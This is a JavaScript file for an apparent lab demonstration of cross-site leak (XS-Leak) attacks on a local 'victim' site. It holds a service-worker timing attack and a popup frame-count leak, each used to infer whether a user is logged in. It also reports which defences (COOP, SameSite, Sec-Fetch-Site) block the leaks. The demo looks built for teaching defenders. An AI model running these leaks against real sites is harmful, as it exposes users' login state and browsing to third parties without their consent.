const victimOrigin = document.body.dataset.victimOrigin;
const timingTargetUrl = `${victimOrigin}/private-group/asset.js`;
const popupTargetUrl = `${victimOrigin}/private-group`;

const timingOut = document.getElementById('timingOut');
const popupOut = document.getElementById('popupOut');
const runTimingBtn = document.getElementById('runTimingBtn');
const clearHistoryBtn = document.getElementById('clearHistoryBtn');
const runPopupBtn = document.getElementById('runPopupBtn');
const runLabelInput = document.getElementById('runLabel');
const historyTable = document.getElementById('historyTable');
const historyBody = document.getElementById('historyBody');

const HISTORY_STORAGE_KEY = 'demoARuns';
const runs = loadSavedRuns();

if ('serviceWorker' in navigator) {
  navigator.serviceWorker.register('/sw.js');
}

function loadSavedRuns() {
  try {
    const raw = sessionStorage.getItem(HISTORY_STORAGE_KEY);
    if (!raw) return [];
    const parsed = JSON.parse(raw);
    return Array.isArray(parsed) ? parsed : [];
  } catch {
    return [];
  }
}

function saveRuns() {
  try {
    sessionStorage.setItem(HISTORY_STORAGE_KEY, JSON.stringify(runs));
  } catch {
    // Ignore storage errors (e.g. private browsing restrictions).
  }
}

function createMetricCell(median, spread, maxVal, barClass) {
  const td = document.createElement('td');
  td.className = 'metric-cell';

  const label = document.createElement('div');
  label.className = 'metric-val';
  label.textContent = `${median.toFixed(2)} ms (${spread.toFixed(2)} ms)`;

  const track = document.createElement('div');
  track.className = 'bar-track';

  const fill = document.createElement('div');
  fill.className = `bar-fill ${barClass}`;
  const pct = maxVal > 0 ? Math.max(3, Math.round((median / maxVal) * 100)) : 0;
  fill.style.width = `${pct}%`;

  track.appendChild(fill);
  td.appendChild(label);
  td.appendChild(track);
  return td;
}

function renderHistory() {
  historyBody.replaceChildren();
  if (runs.length === 0) {
    historyTable.hidden = true;
    return;
  }

  historyTable.hidden = false;
  const maxNet = Math.max(...runs.map((r) => r.netMedian));
  const maxSw = Math.max(...runs.map((r) => r.swMedian));

  for (const run of runs) {
    const tr = document.createElement('tr');

    const numTd = document.createElement('td');
    numTd.textContent = String(run.index);

    const noteTd = document.createElement('td');
    noteTd.textContent = run.label;

    tr.appendChild(numTd);
    tr.appendChild(noteTd);
    tr.appendChild(createMetricCell(run.netMedian, run.netSpread, maxNet, 'bar-fill-net'));
    tr.appendChild(createMetricCell(run.swMedian, run.swSpread, maxSw, 'bar-fill-sw'));
    historyBody.appendChild(tr);
  }
}

function appendHistoryRow(label, data) {
  const index = runs.length + 1;
  runs.push({
    index,
    label: label || `Run ${index}`,
    netMedian: Number(data.netMedian),
    netSpread: Number(data.netSpread),
    swMedian: Number(data.swMedian),
    swSpread: Number(data.swSpread),
  });
  saveRuns();
  renderHistory();
}

async function runTimingAttack() {
  if (!('serviceWorker' in navigator)) {
    timingOut.textContent = 'Service Workers are unavailable in this context (open via attacker.localhost).';
    return;
  }

  runTimingBtn.disabled = true;
  timingOut.textContent = 'Measuring...';

  try {
    const reg = await navigator.serviceWorker.ready;
    const channel = new MessageChannel();

    channel.port1.onmessage = (event) => {
      runTimingBtn.disabled = false;
      const d = event.data;
      if (!d.ok) {
        timingOut.textContent = 'Error: ' + d.error;
        return;
      }

      timingOut.textContent =
        `Classic Network Fetch (median): ${d.netMedian} ms  (spread: ${d.netSpread} ms)\n` +
        `Service Worker Cache  (median): ${d.swMedian} ms  (spread: ${d.swSpread} ms)\n\n` +
        `Compare Logged OUT vs Logged IN on ${victimOrigin}.\n` +
        `A higher Service Worker median = larger response (Logged IN).`;

      appendHistoryRow(runLabelInput.value.trim(), d);
      runLabelInput.value = '';
    };

    reg.active.postMessage({ target: timingTargetUrl }, [channel.port2]);
  } catch (err) {
    runTimingBtn.disabled = false;
    timingOut.textContent = 'Error: ' + err;
  }
}

function runPopupLeak() {
  popupOut.textContent = 'Opening popup...';
  const win = window.open(popupTargetUrl, '_blank', 'width=400,height=300');
  if (!win) {
    popupOut.textContent = 'Popup blocked by browser (allow popups for this site to run Demo B).';
    return;
  }

  setTimeout(() => {
    try {
      if (win.closed) {
        popupOut.textContent = 'Popup handle severed (COOP: same-origin blocked the leak).';
        return;
      }
      const frameCount = win.length;
      win.close();
      if (frameCount > 0) {
        popupOut.textContent = `LEAKED: popup.length = ${frameCount} -> Victim is LOGGED IN (even with SameSite=Lax!).`;
      } else {
        popupOut.textContent = 'popup.length = 0 -> Victim is LOGGED OUT, or blocked by SameSite=Strict / Sec-Fetch-Site.';
      }
    } catch (err) {
      popupOut.textContent = 'Blocked by browser: ' + err;
    }
  }, 700);
}

if (runTimingBtn && clearHistoryBtn && historyTable && historyBody) {
  renderHistory();
  runTimingBtn.addEventListener('click', runTimingAttack);
  clearHistoryBtn.addEventListener('click', () => {
    runs.length = 0;
    saveRuns();
    renderHistory();
  });
}

if (runPopupBtn) {
  runPopupBtn.addEventListener('click', runPopupLeak);
}
